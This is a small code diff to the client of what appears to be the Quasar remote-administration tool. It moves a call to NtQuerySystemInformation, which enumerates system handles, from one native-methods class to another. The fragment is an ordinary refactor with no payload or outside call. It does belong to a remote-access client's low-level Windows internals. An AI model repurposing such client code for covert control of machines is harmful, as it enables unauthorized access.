@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Quasar.Client.Utilities;
+using System;
 using System.Runtime.InteropServices;
 
 namespace Quasar.Client.Win32PE.Structs
@@ -72,7 +73,7 @@ namespace Quasar.Client.Win32PE.Structs
 
             while (true)
             {
-                ret = NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, ptr, guessSize, out var requiredSize);
+                ret = ClientNatives.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, ptr, guessSize, out var requiredSize);
 
                 if (ret == NT_STATUS.STATUS_INFO_LENGTH_MISMATCH)
                 {
